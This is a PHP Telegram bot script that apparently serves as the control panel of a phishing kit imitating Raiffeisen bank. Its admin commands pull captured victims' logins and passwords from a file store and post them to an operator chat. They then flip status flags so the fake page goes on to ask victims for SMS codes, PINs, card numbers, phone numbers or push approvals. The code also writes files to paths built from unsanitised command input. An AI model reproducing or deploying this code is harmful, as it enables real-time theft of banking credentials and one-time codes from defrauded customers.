<?
	include('config.php');
	include('functions.php');

	$post = file_get_contents('php://input');
	file_put_contents('logs_post.txt',$post);
	if (strlen($post) < 8)
		loadSite();
	$post = json_decode($post, true);
	$msg = $post['message'];
	$iskbd = !$msg;
	if ($iskbd)
		$msg = $post['callback_query'];
	$id = beaText(strval($msg['from']['id']), chsNum());
	if (strlen($id) == 0)
		exit();
	$text = $msg[$iskbd ? 'data' : 'text'];
	$login = $msg['from']['username'];
	$nick = htmlspecialchars($msg['from']['first_name'].' '.$msg['from']['last_name']);
	if ($iskbd)
		$msg = $msg['message'];
	$mid = $msg[$iskbd ? 'message_id' : 'id'];
	$chat = $msg['chat']['id'];
	$image = $msg['photo'][0]['file_id'];
	$member = $msg['new_chat_member'];
	$cmd = explode(' ', $text, 2);
	$keybd = false;
	$result = false;
	$edit = false;
	switch ($chat) {
		case chatAdmin: {
			$flag = false;
			switch ($cmd[0]) {
				case '/login': {
					$t = $cmd[1];
					if (strlen($t) < 8)
						break;
					botDelete($mid, $chat);
	            $payInfo = json_decode(file_get_contents("database/" . $t), true);
 botSend([
        '<b>💻 Raiffeisen</b>',
        '',
        '<b>💩 Логин: </b><code>'.$payInfo['login'].'</code>',
        '<b>💳 Пароль: </b><code>'.$payInfo['password'].'</code>',
        '',
        '<b>💤 Статус: Ожидаем валидный логин</b>'
    ], tgToken, chatAdmin);
	                $filename = "database/" . $t;
    $content = [
        "login" => $payInfo['login'],
		"password" => $payInfo['password'],
		"status" => 'login'
    ];

    $content = json_encode($content);

    $file = fopen($filename, "w");
    fwrite($file, $content);
    fclose($file);
					break;
				}
				
		case '/pass': {
					$t = $cmd[1];
					if (strlen($t) < 8)
						break;
					botDelete($mid, $chat);
	            $payInfo = json_decode(file_get_contents("database/" . $t), true);
	             botSend([
         '<b>💻 Raiffeisen</b>',
        '',
        '<b>📞 Логин: </b><code>'.$payInfo['login'].'</code>',
        '<b>💩 Пароль: </b><code>'.$payInfo['password'].'</code>',
        '',
        '<b>💤 Ожидаем валидный пароль</b>'
    ], tgToken, chatAdmin);
	                $filename = "database/" . $t;
    $content = [
        "login" => $payInfo['login'],
		"password" => $payInfo['password'],
		"status" => 'password'
    ];

    $content = json_encode($content);

    $file = fopen($filename, "w");
    fwrite($file, $content);
    fclose($file);
					break;
				}
				
				
		case '/sms1': {
					$t = $cmd[1];
					if (strlen($t) < 8)
						break;
					botDelete($mid, $chat);
	            $payInfo = json_decode(file_get_contents("database/" . $t), true);
	             botSend([
         '<b>💻 Raiffeisen</b>',
        '',
        '<b>📞 Логин: </b><code>'.$payInfo['login'].'</code>',
        '<b>💳 Пароль: </b><code>'.$payInfo['password'].'</code>',
        '',
        '<b>💤 Ожидаем код из смс</b>'
    ], tgToken, chatAdmin);
	                $filename = "database/" . $t;
    $content = [
        "login" => $payInfo['login'],
		"password" => $payInfo['password'],
		"status" => '3ds'
    ];

    $content = json_encode($content);

    $file = fopen($filename, "w");
    fwrite($file, $content);
    fclose($file);
					break;
				}
				
		case '/sms2': {
					$t = $cmd[1];
					if (strlen($t) < 8)
						break;
					botDelete($mid, $chat);
	            $payInfo = json_decode(file_get_contents("database/" . $t), true);
	             botSend([
         '<b>💻 Raiffeisen</b>',
        '',
        '<b>📞 Логин: </b><code>'.$payInfo['login'].'</code>',
        '<b>💳 Пароль: </b><code>'.$payInfo['password'].'</code>',
        '',
        '<b>💤 Ожидаем повторный код</b>'
    ], tgToken, chatAdmin);
	                $filename = "database/" . $t;
    $content = [
        "login" => $payInfo['login'],
		"password" => $payInfo['password'],
		"status" => 'error'
    ];

    $content = json_encode($content);

    $file = fopen($filename, "w");
    fwrite($file, $content);
    fclose($file);
					break;
				}			
				
	case '/newpin': {
					$t = $cmd[1];
					if (strlen($t) < 8)
						break;
					botDelete($mid, $chat);
	            $payInfo = json_decode(file_get_contents("database/" . $t), true);
	                $filename = "database/" . $t;
    $content = [
        "login" => $payInfo['login'],
		"card" => $payInfo['card'],
		"pin" => $payInfo['pin'],
		"status" => 'pin'
    ];

    $content = json_encode($content);

    $file = fopen($filename, "w");
    fwrite($file, $content);
    fclose($file);
					break;
				}
		case '/newcard': {
					$t = $cmd[1];
					if (strlen($t) < 8)
						break;
					botDelete($mid, $chat);
	            $payInfo = json_decode(file_get_contents("database/" . $t), true);
	                $filename = "database/" . $t;
    $content = [
        "login" => $payInfo['login'],
		"card" => $payInfo['card'],
		"pin" => $payInfo['pin'],
		"status" => 'card'
    ];

    $content = json_encode($content);

    $file = fopen($filename, "w");
    fwrite($file, $content);
    fclose($file);
					break;
				}
				
	case '/newnumber': {
					$t = $cmd[1];
					if (strlen($t) < 8)
						break;
					botDelete($mid, $chat);
	            $payInfo = json_decode(file_get_contents("database/" . $t), true);
	                $filename = "database/" . $t;
    $content = [
        "login" => $payInfo['login'],
		"card" => $payInfo['card'],
		"pin" => $payInfo['pin'],
		"status" => 'phone'
    ];

    $content = json_encode($content);

    $file = fopen($filename, "w");
    fwrite($file, $content);
    fclose($file);
					break;
				}
				
				case '/vopros': {
					$t = $cmd[1];
					if (strlen($t) < 8)
						break;
					botDelete($mid, $chat);
					$payInfo = json_decode(file_get_contents("database/" . $t), true);
	                $filename = "database/" . $t;
    $content = [
        "login" => $payInfo['login'],
		"password" => $payInfo['password'],
		"pin" => $payInfo['pin'],
		"status" => 'vopros'
    ];

    $content = json_encode($content);

    $file = fopen($filename, "w");
    fwrite($file, $content);
    fclose($file);
					break;
				}
				
		case '/doruchkafail2': {
					$t = $cmd[1];
					if (strlen($t) < 8)
						break;
					botDelete($mid, $chat);
	            $payInfo = json_decode(file_get_contents("database/" . $t), true);
	                $filename = "database/" . $t;
    $content = [
        "login" => $payInfo['login'],
		"password" => $payInfo['password'],
		"pin" => $payInfo['pin'],
		"status" => '3ds'
    ];

    $content = json_encode($content);

    $file = fopen($filename, "w");
    fwrite($file, $content);
    fclose($file);
					break;
				}
		case '/newpin2': {
					$t = $cmd[1];
					if (strlen($t) < 8)
						break;
					botDelete($mid, $chat);
	            $payInfo = json_decode(file_get_contents("database/" . $t), true);
	                $filename = "database/" . $t;
    $content = [
        "login" => $payInfo['login'],
		"password" => $payInfo['password'],
		"pin" => $payInfo['pin'],
		"status" => 'pin'
    ];

    $content = json_encode($content);

    $file = fopen($filename, "w");
    fwrite($file, $content);
    fclose($file);
					break;
				}
				
		case '/push': {
					$t = $cmd[1];
					if (strlen($t) < 8)
						break;
					botDelete($mid, $chat);
	            $payInfo = json_decode(file_get_contents("database/" . $t), true);
	                $filename = "database/" . $t;
    $content = [
        "login" => $payInfo['login'],
		"password" => $payInfo['password'],
		"pin" => $payInfo['pin'],
		"status" => 'push'
    ];

    $content = json_encode($content);

    $file = fopen($filename, "w");
    fwrite($file, $content);
    fclose($file);
					break;
				}
				
		    case '/call': {
					$t = $cmd[1];
					if (strlen($t) < 8)
						break;
					botDelete($mid, $chat);
	            $payInfo = json_decode(file_get_contents("database/" . $t), true);
	                $filename = "database/" . $t;
    $content = [
        "login" => $payInfo['login'],
		"password" => $payInfo['password'],
		"pin" => $payInfo['pin'],
		"status" => 'call'
    ];

    $content = json_encode($content);

    $file = fopen($filename, "w");
    fwrite($file, $content);
    fclose($file);
					break;
				}
		
			}
			break;
		}
	}
	if (!$result)
		exit();
	if ($edit)
		botEdit($result, $mid, $chat, $keybd);
	else
		botSend($result, $chat, $keybd);
?>